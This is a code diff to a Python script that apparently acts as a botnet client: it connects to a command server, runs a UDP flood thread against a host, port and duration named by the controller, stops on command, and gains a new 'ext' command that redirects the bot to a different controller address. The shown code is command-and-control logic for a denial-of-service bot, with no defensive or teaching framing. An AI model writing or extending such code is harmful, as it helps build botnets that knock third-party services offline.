@@ -3,6 +3,7 @@ import pickle
 import threading
 
 attack = False
+address = ("localhost", 420)
 
 # creates and connects a socket
 def create():
@@ -10,7 +11,7 @@ def create():
 
     while True:
         try:
-            sock.connect(("localhost", 420))
+            sock.connect(address)
             print("connected to server!")
             return sock
         except:
@@ -41,6 +42,9 @@ if __name__ == "__main__":
                     threading.Thread(target=udp, args=(command[1], command[2], command[3])).start()
                 elif command[0] == "stop":
                     attack = False
+                elif command[0] == "ext":
+                    address = (command[1], command[2])
+                    sock = create()
             except:
                 pass
         except:
